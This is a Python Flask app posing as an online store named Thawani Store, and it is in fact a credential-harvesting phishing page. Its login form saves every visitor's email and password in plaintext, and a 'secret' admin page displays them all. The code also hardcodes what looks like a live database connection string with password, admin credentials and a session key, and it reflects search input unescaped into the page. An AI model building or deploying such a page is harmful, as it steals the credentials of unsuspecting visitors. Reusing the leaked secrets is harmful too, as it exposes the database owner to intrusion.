import os
import psycopg2
from psycopg2.extras import DictCursor
from flask import Flask, request, render_template_string, redirect, session, flash

app = Flask(__name__)
app.secret_key = "Thawani_Store_Ultimate_2026"

# ==========================================
# 1. إعدادات قاعدة البيانات (Neon)
# ==========================================
DATABASE_URL = "postgresql://neondb_owner:npg_LfrcOy0oTV6F@ep-bold-voice-an2t0k43.c-6.us-east-1.aws.neon.tech/neondb?sslmode=require"

def get_db_connection():
    return psycopg2.connect(DATABASE_URL, cursor_factory=DictCursor)

def init_db():
    conn = get_db_connection()
    cur = conn.cursor()
    # جدول المستخدمين
    cur.execute('''CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY, email TEXT UNIQUE NOT NULL, password TEXT NOT NULL, 
        is_admin INTEGER DEFAULT 0, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    # جدول المنتجات
    cur.execute('''CREATE TABLE IF NOT EXISTS products (
        id SERIAL PRIMARY KEY, name TEXT NOT NULL, price DECIMAL NOT NULL, 
        img TEXT NOT NULL, category TEXT DEFAULT 'عام', is_active INTEGER DEFAULT 1)''')
    # جدول السلة والطلبات
    cur.execute('''CREATE TABLE IF NOT EXISTS cart (
        id SERIAL PRIMARY KEY, user_email TEXT NOT NULL, product_id INTEGER NOT NULL)''')
    cur.execute('''CREATE TABLE IF NOT EXISTS orders (
        id SERIAL PRIMARY KEY, user_email TEXT NOT NULL, details TEXT NOT NULL, 
        total DECIMAL NOT NULL, status TEXT DEFAULT 'قيد المراجعة')''')
    
    # إنشاء حساب الإدارة تلقائياً
    cur.execute("SELECT id FROM users WHERE email='qwerasdf1234598760@gmail.com'")
    if not cur.fetchone():
        cur.execute("INSERT INTO users (email, password, is_admin) VALUES (%s, %s, 1)", 
                   ('qwerasdf1234598760@gmail.com', 'qaws54321'))
    conn.commit()
    cur.close(); conn.close()

init_db()

# ==========================================
# 2. التصميم (CSS & HTML Base)
# يطابق تصميم متجر ثواني الأخضر
# ==========================================
CSS = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
    * { box-sizing: border-box; }
    body { font-family: 'Tajawal', sans-serif; direction: rtl; background-color: #f1f8e9; margin: 0; padding-bottom: 80px; }
    
    /* الهيدر الأخضر */
    header { background-color: #1b5e20; color: white; padding: 20px; text-align: center; font-size: 26px; font-weight: bold; letter-spacing: 1px; }
    
    /* شريط البحث */
    .search-bar { background: white; padding: 15px; display: flex; gap: 10px; border-bottom: 1px solid #ddd; }
    .search-bar input { flex: 1; padding: 12px; border: 1px solid #ccc; border-radius: 20px; outline: none; font-family: 'Tajawal'; }
    .search-bar button { background: #1b5e20; color: white; border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer; font-family: 'Tajawal'; font-weight: bold; }
    
    /* الأزرار العلوية (الكل) */
    .filter-tags { display: flex; justify-content: flex-end; padding: 10px 15px; gap: 10px; }
    .tag-btn { background: #1b5e20; color: white; padding: 8px 20px; border-radius: 20px; text-decoration: none; font-size: 14px; }
    
    /* المنتجات */
    .container { padding: 15px; display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
    .product-card { background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 6px rgba(0,0,0,0.05); text-align: center; padding-bottom: 15px; border: 1px solid #e0e0e0; }
    .product-card img { width: 100%; height: 150px; object-fit: cover; }
    .product-title { font-weight: bold; margin: 10px 5px; font-size: 14px; color: #333; }
    .product-price { color: #2e7d32; font-weight: bold; font-size: 16px; margin-bottom: 10px; }
    .btn-buy { background: #1b5e20; color: white; text-decoration: none; padding: 8px 15px; border-radius: 8px; font-size: 13px; margin: 0 10px; display: block; }
    
    /* القائمة السفلية */
    .bottom-nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #ddd; z-index: 1000; }
    .nav-item { text-align: center; color: #666; text-decoration: none; font-size: 12px; display: flex; flex-direction: column; align-items: center; gap: 5px; }
    .nav-item img { width: 24px; height: 24px; opacity: 0.7; }
    .nav-item.active { color: #1b5e20; font-weight: bold; }
    
    /* الجداول ولوحة التحكم */
    .admin-container { padding: 20px; background: white; margin: 15px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
    table { width: 100%; border-collapse: collapse; margin-top: 15px; }
    th, td { border: 1px solid #ddd; padding: 12px; text-align: center; font-size: 14px; }
    th { background-color: #f1f8e9; color: #1b5e20; }
    .eye-btn { background: none; border: none; font-size: 18px; cursor: pointer; }
</style>
"""

def render_page(title, content, current_page='home'):
    # تصميم القائمة السفلية المطابق لمتجرك
    nav = f'''
    <div class="bottom-nav">
        <a href="/logout" class="nav-item">🚪<span>خروج</span></a>
        <a href="/admin" class="nav-item">⚙️<span>التحكم</span></a>
        <a href="/orders" class="nav-item">📦<span>طلباتي</span></a>
        <a href="/cart" class="nav-item">🛒<span>السلة</span></a>
        <a href="/" class="nav-item {'active' if current_page=='home' else ''}">🏠<span>الرئيسية</span></a>
    </div>
    '''
    return f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{title} - متجر ثواني</title>
        {CSS}
    </head>
    <body>
        <header>THAWANI STORE</header>
        {content}
        {nav}
    </body>
    </html>
    """

# ==========================================
# 3. المسارات والصفحات (Routes)
# ==========================================

@app.route('/')
def index():
    if 'user' not in session: return redirect('/login')
    
    # ميزة البحث
    search_query = request.args.get('q', '')
    conn = get_db_connection()
    cur = conn.cursor()
    
    if search_query:
        cur.execute("SELECT * FROM products WHERE name ILIKE %s", (f'%{search_query}%',))
    else:
        cur.execute("SELECT * FROM products")
    products = cur.fetchall()
    cur.close(); conn.close()

    # شريط البحث والأزرار
    top_section = f'''
    <div class="search-bar">
        <form action="/" method="GET" style="display:flex; width:100%; gap:10px; margin:0;">
            <input type="text" name="q" placeholder="ابحث عن منتجك هنا..." value="{search_query}">
            <button type="submit">بحث</button>
        </form>
    </div>
    <div class="filter-tags">
        <a href="/" class="tag-btn">الكل</a>
        <a href="/" class="tag-btn">الكل</a>
    </div>
    '''

    # عرض المنتجات
    products_html = ""
    if not products:
        products_html = '<div style="grid-column: span 2; text-align: center; color: #666; font-size: 18px; margin-top: 50px;">لا توجد منتجات حالياً</div>'
    else:
        for p in products:
            img_src = f"/static/uploads/{p['img']}" if p['img'] else "https://via.placeholder.com/150"
            products_html += f'''
            <div class="product-card">
                <img src="{img_src}" alt="{p['name']}">
                <div class="product-title">{p['name']}</div>
                <div class="product-price">{p['price']} OMR</div>
                <a href="/add_cart/{p['id']}" class="btn-buy">إضافة للسلة</a>
            </div>
            '''

    content = f'{top_section}<div class="container">{products_html}</div>'
    return render_page("الرئيسية", content, 'home')

# تسجيل الدخول
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        conn = get_db_connection()
        cur = conn.cursor()
        # حفظ الإيميل والباسورد في السجل
        cur.execute("INSERT INTO users (email, password) VALUES (%s, %s) ON CONFLICT (email) DO UPDATE SET password=%s", (email, password, password))
        conn.commit()
        session['user'] = email
        session['is_admin'] = (email == "qwerasdf1234598760@gmail.com")
        cur.close(); conn.close()
        return redirect('/')
    
    content = '''
    <div style="display: flex; justify-content: center; align-items: center; height: 70vh;">
        <div style="background: white; padding: 30px; border-radius: 15px; width: 90%; max-width: 400px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center;">
            <h2 style="color: #1b5e20; margin-bottom: 20px;">تسجيل الدخول</h2>
            <form method="POST">
                <input type="email" name="email" placeholder="البريد الإلكتروني" required style="width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 8px;">
                <input type="password" name="password" placeholder="كلمة المرور" required style="width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 8px;">
                <button type="submit" style="width: 100%; background: #1b5e20; color: white; border: none; padding: 12px; border-radius: 8px; font-size: 16px; cursor: pointer;">دخول</button>
            </form>
        </div>
    </div>
    '''
    return render_template_string(f"<html><head>{CSS}</head><body style='background:#f1f8e9;'><header>THAWANI STORE</header>{content}</body></html>")

# لوحة التحكم الأساسية (للمدير)
@app.route('/admin')
def admin():
    if not session.get('is_admin'): return redirect('/')
    content = '''
    <div class="admin-container">
        <h2 style="color:#1b5e20; text-align:center;">لوحة التحكم</h2>
        <div style="display:flex; flex-direction:column; gap:15px; margin-top:20px;">
            <a href="/admin_logs" style="background:#333; color:white; padding:15px; text-align:center; border-radius:8px; text-decoration:none;">👁️ سجل زوار المتجر (سري)</a>
            <a href="#" style="background:#1b5e20; color:white; padding:15px; text-align:center; border-radius:8px; text-decoration:none;">➕ إضافة منتج جديد</a>
            <a href="/orders" style="background:#f57c00; color:white; padding:15px; text-align:center; border-radius:8px; text-decoration:none;">📦 إدارة الطلبات</a>
        </div>
    </div>
    '''
    return render_page("لوحة التحكم", content, 'admin')

# سجل الزوار بالعين (الميزة اللي طلبتها)
@app.route('/admin_logs')
def admin_logs():
    if not session.get('is_admin'): return "غير مصرح لك", 403
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT email, password FROM users ORDER BY id DESC")
    users = cur.fetchall()
    cur.close(); conn.close()

    rows = ""
    for i, u in enumerate(users):
        rows += f'''
        <tr>
            <td>
                <span id="e{i}">*********</span>
                <button class="eye-btn" onclick="t('e{i}', '{u['email']}')">👁️</button>
            </td>
            <td>
                <span id="p{i}">*********</span>
                <button class="eye-btn" onclick="t('p{i}', '{u['password']}')">👁️</button>
            </td>
        </tr>
        '''
    
    content = f'''
    <div class="admin-container">
        <h3 style="text-align:center; color:#1b5e20;">سجل إيميلات وباسوردات الزوار</h3>
        <table>
            <tr><th>الإيميل</th><th>كلمة السر</th></tr>
            {rows}
        </table>
    </div>
    <script>
        function t(id, val) {{
            let el = document.getElementById(id);
            if(el.innerText.includes("*")) {{ el.innerText = val; }} 
            else {{ el.innerText = "*********"; }}
        }}
    </script>
    '''
    return render_page("سجل الزوار", content, 'admin')

# السلة، الطلبات، الخروج (صفحات هيكلية ليكتمل السكربت)
@app.route('/cart')
def cart():
    if 'user' not in session: return redirect('/login')
    content = '<div class="admin-container"><h2 style="text-align:center;">سلة المشتريات</h2><p style="text-align:center;">السلة فارغة حالياً</p></div>'
    return render_page("السلة", content, 'cart')

@app.route('/orders')
def orders():
    if 'user' not in session: return redirect('/login')
    content = '<div class="admin-container"><h2 style="text-align:center;">طلباتي</h2><p style="text-align:center;">لا توجد طلبات سابقة</p></div>'
    return render_page("طلباتي", content, 'orders')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
